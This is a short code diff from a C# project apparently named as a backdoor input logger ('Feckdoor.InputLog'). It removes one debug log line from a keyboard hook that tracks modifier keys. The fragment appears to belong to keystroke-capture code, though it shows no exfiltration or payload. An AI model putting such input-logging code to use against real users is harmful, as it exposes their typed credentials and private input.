@@ -48,7 +48,6 @@ namespace Feckdoor.InputLog
 					int? modifier = (int?)((VirtualKey)lParam.vkCode).GetModifier();
 					if (modifier != null)
 						ActiveModifiers |= (int)modifier;
-					Log.Information("Modifiers: {0}", (ModifierKey)ActiveModifiers);
 				}
 				else if (wParam == (IntPtr)User32.WM_KEYUP || wParam == (IntPtr)User32.WM_SYSKEYUP)
 				{
